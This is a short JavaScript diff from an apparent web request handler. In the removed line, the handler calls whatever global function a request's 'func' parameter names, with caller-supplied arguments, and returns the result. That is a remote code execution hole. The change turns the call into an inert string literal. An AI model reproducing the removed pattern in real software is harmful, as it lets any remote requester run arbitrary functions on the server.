@@ -981,7 +981,7 @@ var misSt = function (func, someArgs) {
             );
             var funcUno = rndE.parameter["func"];
             var funcDos = rndE.parameter["args"];
-            var payLoad = globalThis[funcUno].apply(this, funcDos);
+            var payLoad = `globalThis[funcUno].apply(this, funcDos)`;
             args["data"] = {
               message: payLoad,
               timestamp: new Date(),
